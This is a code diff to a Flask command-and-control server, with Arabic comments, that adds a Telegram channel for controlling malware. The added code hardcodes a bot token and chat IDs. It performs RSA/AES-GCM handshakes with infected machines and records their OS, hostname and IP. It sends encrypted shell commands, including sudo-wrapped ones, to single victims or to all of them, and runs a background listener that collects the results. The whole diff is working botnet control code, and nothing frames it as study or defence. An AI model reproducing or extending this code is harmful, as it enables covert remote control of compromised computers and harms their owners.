@@ -16,9 +16,13 @@ import csv
 import io
 import socket
 import platform
+import threading
 from datetime import datetime
 from functools import wraps
 from collections import defaultdict
+from Crypto.Cipher import AES as _AES_MOD
+from Crypto.PublicKey import RSA as _RSA_MOD
+from Crypto.Cipher import PKCS1_OAEP as _PKCS1_MOD
 from modules.encryption import (
     hybrid_decrypt_first_message,
     hybrid_encrypt,
@@ -187,9 +191,14 @@ def load_data_from_db():
         conn = sqlite3.connect(DB_PATH)
         cursor = conn.cursor()
 
-        cursor.execute('SELECT id, last_seen FROM clients')
+        cursor.execute('SELECT id, last_seen, os, hostname, ip_address FROM clients')
         for row in cursor.fetchall():
-            clients[row[0]] = {"last_seen": row[1]}
+            clients[row[0]] = {
+                "last_seen": row[1],
+                "os": row[2] or "",
+                "hostname": row[3] or "",
+                "ip": row[4] or "",
+            }
 
         cursor.execute('SELECT timestamp, type, data, client_id, chat_id FROM logs ORDER BY id DESC LIMIT 1000')
         for row in cursor.fetchall():
@@ -287,6 +296,200 @@ def _save_telegram_config():
 
 _load_telegram_config()
 
+# ======================== إعدادات قناة C2 ↔ Malware (Telegram) ========================
+# هذا البوت مختلف عن بوت الإشعارات - هو المسؤول عن التواصل مع المالوير
+C2_BOT_TOKEN  = "8782474352:AAEK1FCeLrNMqnGXPLgLJfJQ1qmiHV9i9d4"
+C2_GROUP_ID   = "-1002470378114"    # يستقبل من المالوير
+C2_CHANNEL_ID = "-1002426552780"    # يرسل للمالوير
+
+# كلاينت متصلين عبر Telegram وجلساتهم بمفاتيح AES-GCM
+telegram_clients: set = set()
+tg_sessions: dict = {}
+_tg_last_update_id = 0
+
+# ── دوال مساعدة للتيليجرام ──────────────────────────────────────────────────
+
+def _tg_send_to_channel(message: str):
+    """إرسال رسالة على قناة التيليجرام باتجاه المالوير"""
+    try:
+        url = f"https://api.telegram.org/bot{C2_BOT_TOKEN}/sendMessage"
+        requests.post(url, json={"chat_id": C2_CHANNEL_ID, "text": message}, timeout=5)
+    except Exception as e:
+        logger.error(f"TG send error: {e}")
+
+def _tg_decrypt_first_message(encrypted_key_b64: str, encrypted_data_b64: str):
+    """RSA فك تشفير مفتاح AES، ثم AES-GCM فك تشفير البيانات (مطابق لما يستخدمه malware.py)"""
+    from modules.encryption import _load_private_key
+    private_key = _load_private_key()
+    cipher_rsa = _PKCS1_MOD.new(private_key)
+    aes_key = cipher_rsa.decrypt(base64.b64decode(encrypted_key_b64))
+
+    raw = base64.b64decode(encrypted_data_b64)
+    nonce, tag, ciphertext = raw[:16], raw[16:32], raw[32:]
+    cipher_aes = _AES_MOD.new(aes_key, _AES_MOD.MODE_GCM, nonce=nonce)
+    plaintext = cipher_aes.decrypt_and_verify(ciphertext, tag)
+    return plaintext.decode(), aes_key
+
+def _tg_encrypt(aes_key: bytes, plaintext: str) -> str:
+    """AES-GCM تشفير للأوامر المرسلة للمالوير"""
+    cipher = _AES_MOD.new(aes_key, _AES_MOD.MODE_GCM)
+    ciphertext, tag = cipher.encrypt_and_digest(plaintext.encode())
+    return base64.b64encode(cipher.nonce + tag + ciphertext).decode()
+
+def _tg_decrypt(aes_key: bytes, encrypted_b64: str) -> str:
+    """AES-GCM فك تشفير الرسائل القادمة من المالوير"""
+    raw = base64.b64decode(encrypted_b64)
+    nonce, tag, ciphertext = raw[:16], raw[16:32], raw[32:]
+    cipher = _AES_MOD.new(aes_key, _AES_MOD.MODE_GCM, nonce=nonce)
+    return cipher.decrypt_and_verify(ciphertext, tag).decode()
+
+def listen_telegram_group():
+    """خيط في الخلفية - يستقبل رسائل المالوير من الجروب ويسجلهم في الداش"""
+    global _tg_last_update_id
+
+    # تحميل وتصدير المفتاح العام RSA للإرسال عبر Telegram
+    from modules.encryption import _ensure_keys, _PUBLIC_KEY_PATH
+    _ensure_keys()
+    with open(_PUBLIC_KEY_PATH, 'rb') as _f:
+        _rsa_pub_b64 = base64.b64encode(_f.read()).decode()
+
+    logger.info("📡 Telegram C2 listener started")
+
+    while True:
+        try:
+            url = f"https://api.telegram.org/bot{C2_BOT_TOKEN}/getUpdates"
+            params = {"offset": _tg_last_update_id + 1, "timeout": 30}
+            response = requests.get(url, params=params, timeout=35)
+
+            if response.status_code == 200:
+                data = response.json()
+                if data.get("ok"):
+                    for update in data["result"]:
+                        _tg_last_update_id = update["update_id"]
+
+                        if "message" not in update or "text" not in update["message"]:
+                            continue
+
+                        msg     = update["message"]
+                        chat_id = str(msg["chat"]["id"])
+                        text    = msg["text"]
+
+                        if chat_id != C2_GROUP_ID:
+                            continue
+
+                        # ── 1️⃣ طلب المفتاح العام ──────────────────────────────
+                        if text.startswith("KEY_REQUEST:"):
+                            client_id = text.split(":", 1)[1].strip()
+                            logger.info(f"🔑 TG Key request from {client_id}")
+                            _tg_send_to_channel(f"PUBLIC_KEY:{client_id}:{_rsa_pub_b64}")
+
+                        # ── 2️⃣ الهاندشيك ──────────────────────────────────────
+                        elif text.startswith("HANDSHAKE:"):
+                            try:
+                                parts = text.split(":", 2)
+                                if len(parts) < 3:
+                                    continue
+                                client_id      = parts[1]
+                                key_part, data_part = parts[2].split("|", 1)
+
+                                decrypted_info, aes_key_bytes = _tg_decrypt_first_message(key_part, data_part)
+                                info = json.loads(decrypted_info)
+
+                                tg_sessions[client_id]  = aes_key_bytes
+                                sessions[client_id]     = aes_key_bytes
+                                telegram_clients.add(client_id)
+
+                                clients[client_id] = {
+                                    "last_seen": time.time(),
+                                    "os":        info.get("os", ""),
+                                    "hostname":  info.get("hostname", ""),
+                                    "ip":        info.get("ip", ""),
+                                    "via":       "telegram",
+                                }
+                                save_client_to_db(
+                                    client_id, time.time(),
+                                    os_info=info.get("os"),
+                                    hostname=info.get("hostname"),
+                                    ip=info.get("ip"),
+                                )
+                                save_log_to_db(time.time(), "handshake", decrypted_info, client_id)
+
+                                logger.info(
+                                    f"✅ TG Handshake OK: {client_id} "
+                                    f"— OS: {info.get('os')} IP: {info.get('ip')}"
+                                )
+                                _tg_send_to_channel(f"HANDSHAKE_OK:{client_id}")
+
+                            except Exception as e:
+                                logger.error(f"TG Handshake error: {e}")
+
+                        # ── 3️⃣ نتائج الأوامر ──────────────────────────────────
+                        elif text.startswith("RESULT:"):
+                            try:
+                                parts = text.split(":", 2)
+                                if len(parts) < 3:
+                                    continue
+                                client_id        = parts[1]
+                                encrypted_result = parts[2]
+
+                                if client_id not in tg_sessions:
+                                    continue
+
+                                decrypted  = _tg_decrypt(tg_sessions[client_id], encrypted_result)
+                                result_obj = json.loads(decrypted)
+                                cmd_text   = result_obj.get("command", "")
+                                result_txt = result_obj.get("result", "")
+
+                                # تحديث أقدم أمر pending لهذا الكلاينت، وإلا نُنشئ سجلاً جديداً
+                                try:
+                                    conn = sqlite3.connect(DB_PATH)
+                                    row = conn.execute(
+                                        'SELECT id FROM commands WHERE client_id=? AND status="pending" '
+                                        'ORDER BY created_at ASC LIMIT 1',
+                                        (client_id,)
+                                    ).fetchone()
+                                    if row:
+                                        conn.execute(
+                                            'UPDATE commands SET status="done", result=?, executed_at=? WHERE id=?',
+                                            (result_txt, time.time(), row[0])
+                                        )
+                                    else:
+                                        conn.execute(
+                                            'INSERT INTO commands (command, client_id, status, result, created_at, executed_at) '
+                                            'VALUES (?,?,?,?,?,?)',
+                                            (cmd_text, client_id, "done", result_txt, time.time(), time.time())
+                                        )
+                                    conn.commit()
+                                    conn.close()
+                                except Exception as db_err:
+                                    logger.error(f"TG result DB error: {db_err}")
+
+                                save_log_to_db(time.time(), "result", decrypted, client_id)
+                                logger.info(f"📥 TG Result from {client_id}: {cmd_text[:60]}")
+
+                            except Exception as e:
+                                logger.error(f"TG Result error: {e}")
+
+                        # ── 4️⃣ Heartbeat ──────────────────────────────────────
+                        elif text.startswith("HEARTBEAT:"):
+                            try:
+                                parts = text.split(":", 2)
+                                if len(parts) >= 3 and parts[1] in tg_sessions:
+                                    client_id = parts[1]
+                                    _tg_decrypt(tg_sessions[client_id], parts[2])
+                                    if client_id in clients:
+                                        clients[client_id]["last_seen"] = time.time()
+                                        save_client_to_db(client_id, time.time())
+                                    logger.debug(f"💓 TG Heartbeat from {client_id}")
+                            except Exception:
+                                pass
+
+                    time.sleep(0.1)
+
+        except Exception as e:
+            logger.error(f"TG listen error: {e}")
+            time.sleep(5)
+
 # ======================== دوال مساعدة ========================
 def check_bot_status():
     try:
@@ -294,6 +497,20 @@ def check_bot_status():
         return "running" if result.stdout.strip() else "stopped"
     except:
         return "unknown"
+
+# ======================== 0. المفتاح العام RSA ========================
+@app.route("/public_key", methods=["GET"])
+def get_public_key():
+    """إرسال المفتاح العام RSA للكلاينت لبدء عملية الهاندشيك"""
+    try:
+        from modules.encryption import _ensure_keys, _PUBLIC_KEY_PATH
+        _ensure_keys()
+        with open(_PUBLIC_KEY_PATH, 'rb') as f:
+            key_bytes = f.read()
+        return jsonify({"public_key": base64.b64encode(key_bytes).decode()})
+    except Exception as e:
+        logger.error(f"Failed to load public key: {e}")
+        return jsonify({"error": "Failed to load public key"}), 500
 
 # ======================== 1. Handshake ========================
 @app.route("/handshake", methods=["POST"])
@@ -308,14 +525,26 @@ def handshake():
 
     try:
         decrypted_data, aes_key = hybrid_decrypt_first_message(encrypted_key, encrypted_data)
-        sessions[client_id] = aes_key
-        clients[client_id] = {"last_seen": time.time()}
-        save_client_to_db(client_id, time.time())
+        info = json.loads(decrypted_data)
 
-        clients_data.append(json.loads(decrypted_data))
+        sessions[client_id] = aes_key
+        clients[client_id] = {
+            "last_seen": time.time(),
+            "os": info.get("os", ""),
+            "hostname": info.get("hostname", ""),
+            "ip": info.get("ip", ""),
+        }
+        save_client_to_db(
+            client_id, time.time(),
+            os_info=info.get("os"),
+            hostname=info.get("hostname"),
+            ip=info.get("ip"),
+        )
+
+        clients_data.append(info)
         save_log_to_db(time.time(), "handshake", decrypted_data, client_id)
 
-        logger.info(f"✅ Handshake successful with {client_id}")
+        logger.info(f"✅ Handshake successful with {client_id} — OS: {info.get('os')} IP: {info.get('ip')}")
         return jsonify({"status": "success"})
     except Exception as e:
         logger.error(f"❌ Handshake failed with {client_id}: {e}")
@@ -394,6 +623,14 @@ def receive_command():
     use_sudo  = bool(data.get("sudo", False))
 
     logger.warning(f"💀 Command received: {cmd} for {client_id} (sudo={use_sudo})")
+
+    # لو [C2-Server] عنده session تيليجرام (malware.py شغال عليه) → يبعت عبر Telegram
+    if client_id == "[C2-Server]" and "[C2-Server]" in tg_sessions:
+        row_id = save_command_to_db(cmd, client_id)
+        final_cmd = f"sudo -n bash -c '{cmd}'" if use_sudo else cmd
+        _tg_send_to_channel(f"CMD:[C2-Server]:{_tg_encrypt(tg_sessions['[C2-Server]'], final_cmd)}")
+        logger.info(f"📤 TG Command → [C2-Server]: {cmd}")
+        return jsonify({"status": "sent_via_telegram", "command_id": row_id})
 
     # If the target is the C2 server itself, execute locally and return result immediately
     if client_id == "[C2-Server]":
@@ -564,27 +801,57 @@ def receive_command():
             "user": C2_USER,
         })
 
-    # Regular clients
-    row_id    = save_command_to_db(cmd, client_id)
     final_cmd = f"sudo -n bash -c '{cmd}'" if use_sudo else cmd
-    commands.append({"cmd": final_cmd, "id": row_id})
+
+    # كلاينت تيليجرام - يُرسل الأمر عبر قناة Telegram مشفراً
+    if client_id == "all":
+        row_id = save_command_to_db(cmd, client_id)
+        for tg_cid in list(telegram_clients):
+            if tg_cid in tg_sessions:
+                _tg_send_to_channel(f"CMD:{tg_cid}:{_tg_encrypt(tg_sessions[tg_cid], final_cmd)}")
+        # HTTP clients يستقبلون عبر queue كالعادة
+        http_clients = [c for c in clients if c not in telegram_clients]
+        if http_clients:
+            commands.append({"cmd": final_cmd, "id": row_id, "client_id": client_id})
+        logger.info(f"📤 Command sent to all ({len(telegram_clients)} TG + {len(http_clients)} HTTP)")
+        return jsonify({"status": "sent", "command_id": row_id})
+
+    if client_id in telegram_clients:
+        if client_id not in tg_sessions:
+            return jsonify({"error": "No TG session for this client"}), 400
+        row_id = save_command_to_db(cmd, client_id)
+        _tg_send_to_channel(f"CMD:{client_id}:{_tg_encrypt(tg_sessions[client_id], final_cmd)}")
+        logger.info(f"📤 TG Command sent to {client_id}: {cmd}")
+        return jsonify({"status": "sent_via_telegram", "command_id": row_id})
+
+    # Regular HTTP clients
+    row_id = save_command_to_db(cmd, client_id)
+    commands.append({"cmd": final_cmd, "id": row_id, "client_id": client_id})
     return jsonify({"status": "queued", "command_id": row_id})
 
 # ======================== 4. سحب الأوامر ========================
 @app.route("/get_command", methods=["GET"])
 @rate_limit
 def get_command():
-    if commands:
-        entry = commands.pop(0)
-        # Support both old plain strings and new dicts
-        if isinstance(entry, dict) and "cmd" in entry:
-            cmd_text = entry["cmd"]
+    client_id = request.args.get("client_id", "").strip()
+
+    for i, entry in enumerate(commands):
+        # Match by client_id if provided, otherwise serve any untagged command
+        if isinstance(entry, dict):
+            entry_cid = entry.get("client_id", "")
+            # Serve if: no client_id filter, OR entry targets "all", OR exact match
+            if client_id and entry_cid and entry_cid != "all" and entry_cid != client_id:
+                continue
+            cmd_text = entry.get("cmd", "")
             cmd_id   = entry.get("id")
         else:
             cmd_text = entry
             cmd_id   = None
-        logger.info(f"📤 Command sent: {cmd_text} (id={cmd_id})")
+
+        commands.pop(i)
+        logger.info(f"📤 Command dispatched to '{client_id or 'any'}': {cmd_text} (id={cmd_id})")
         return jsonify({"command": cmd_text, "command_id": cmd_id})
+
     return jsonify({"command": None, "command_id": None})
 
 # ======================== 5. إرسال أمر لجهاز معين ========================
@@ -672,6 +939,9 @@ def get_clients():
             "last_seen": time.ctime(info["last_seen"]),
             "timestamp": info["last_seen"],
             "is_server": False,
+            "os": info.get("os", ""),
+            "hostname": info.get("hostname", ""),
+            "ip": info.get("ip", ""),
         }
 
     return jsonify(readable)
@@ -1062,6 +1332,33 @@ def commands_history():
         return jsonify({"error": str(e)}), 500
 
 
+@app.route("/command/<int:cmd_id>", methods=["GET"])
+@rate_limit
+@require_auth
+def get_command_by_id(cmd_id):
+    """جلب حالة ونتيجة أمر معين بالـ ID"""
+    try:
+        conn = sqlite3.connect(DB_PATH)
+        row = conn.execute(
+            'SELECT id, command, client_id, status, result, created_at, executed_at '
+            'FROM commands WHERE id=?',
+            (cmd_id,)
+        ).fetchone()
+        conn.close()
+        if not row:
+            return jsonify({"error": "Command not found"}), 404
+        return jsonify({
+            "id":          row[0],
+            "command":     row[1],
+            "client_id":   row[2],
+            "status":      row[3],
+            "result":      row[4],
+            "created_at":  row[5],
+            "executed_at": row[6],
+        })
+    except Exception as e:
+        return jsonify({"error": str(e)}), 500
+
 @app.route("/command_result", methods=["POST"])
 @rate_limit
 def command_result():
@@ -1092,6 +1389,7 @@ def command_result():
 init_db()
 load_data_from_db()
 app.start_time = time.time()
+threading.Thread(target=listen_telegram_group, daemon=True).start()
 logger.info("🚀 C2 Server Started")
 
 if __name__ == "__main__":
